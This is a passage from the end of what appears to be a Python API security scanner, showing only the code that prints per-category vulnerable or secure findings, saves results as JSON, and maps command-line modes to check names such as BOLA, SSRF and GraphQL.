    print(f"Vulnerable categories: {total_vulns}/{len(results['findings'])}")
    print(f"Total security checks: {total_checks}")
    print(f"{'='*70}")
    
    for category, finding in results["findings"].items():
        status = "🔴 VULNERABLE" if finding.get("vulnerable") else "🟢 SECURE"
        print(f"\n  {status} {category.upper()}")
        for detail in finding.get("details", [])[:5]:
            print(f"    -> {detail}")
        if len(finding.get("details", [])) > 5:
            print(f"    ... and {len(finding['details']) - 5} more")
        for check in finding.get("checks", [])[:3]:
            print(f"    ✓ {check.get('type', 'check')}: {check.get('endpoint', check.get('endpoint', ''))}")
    
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n[*] Full results saved to {args.output}")

if __name__ == "__main__":
    mode_map = {
        "bola": "check_bola",
        "auth": "check_broken_auth",
        "property": "check_property_auth",
        "resource": "check_resource_consumption",
        "bfla": "check_bfla",
        "flows": "check_sensitive_flows",
        "ssrf": "check_ssrf",
        "misconfig": "check_misconfiguration",
        "inventory": "check_inventory",
        "consumption": "check_unsafe_consumption",
        "graphql": "check_graphql",
    }
    main()